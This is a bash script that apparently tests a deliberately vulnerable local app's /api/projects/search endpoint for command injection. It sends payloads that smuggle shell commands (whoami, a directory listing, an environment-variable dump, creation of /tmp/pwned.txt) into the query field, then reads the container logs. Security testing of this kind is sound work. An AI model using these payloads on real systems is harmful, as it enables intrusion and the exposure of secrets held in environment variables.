#!/bin/bash

echo "==================================================================="
echo "Testing Command Injection Vulnerability in /api/projects/search"
echo "==================================================================="
echo ""

echo "Test 1: Normal search (no injection)"
echo "Query: 'e-commerce'"
curl -s -G 'http://localhost:3000/api/projects/search' \
  --data-urlencode 'query=e-commerce' \
  -H 'accept: */*' | jq -r 'length' 2>/dev/null || echo "Error"
echo ""

echo "-------------------------------------------------------------------"
echo "Test 2: Command Injection - Execute 'whoami'"
echo "Payload: test\"; whoami; echo \""
curl -s -G 'http://localhost:3000/api/projects/search' \
  --data-urlencode 'query=test"; whoami; echo "' \
  -H 'accept: */*' > /dev/null
echo "Check backend logs with: docker logs vuln-app-backend --tail 5"
echo ""

echo "-------------------------------------------------------------------"
echo "Test 3: Command Injection - List directory contents"
echo "Payload: test\"; ls -la /app; echo \""
curl -s -G 'http://localhost:3000/api/projects/search' \
  --data-urlencode 'query=test"; ls -la /app; echo "' \
  -H 'accept: */*' > /dev/null
echo "Check backend logs with: docker logs vuln-app-backend --tail 10"
echo ""

echo "-------------------------------------------------------------------"
echo "Test 4: Command Injection - Read environment variables"
echo "Payload: test\"; env | grep NODE; echo \""
curl -s -G 'http://localhost:3000/api/projects/search' \
  --data-urlencode 'query=test"; env | grep NODE; echo "' \
  -H 'accept: */*' > /dev/null
echo "Check backend logs with: docker logs vuln-app-backend --tail 10"
echo ""

echo "-------------------------------------------------------------------"
echo "Test 5: Command Injection - Create a file"
echo "Payload: test\"; touch /tmp/pwned.txt && ls -la /tmp/pwned.txt; echo \""
curl -s -G 'http://localhost:3000/api/projects/search' \
  --data-urlencode 'query=test"; touch /tmp/pwned.txt && ls -la /tmp/pwned.txt; echo "' \
  -H 'accept: */*' > /dev/null
echo "Check if file created with: docker exec vuln-app-backend ls -la /tmp/pwned.txt"
echo ""

echo "==================================================================="
echo "BACKEND LOGS (last 20 lines):"
echo "==================================================================="
docker logs vuln-app-backend --tail 20 2>&1 | grep -v "LOG \[Router"
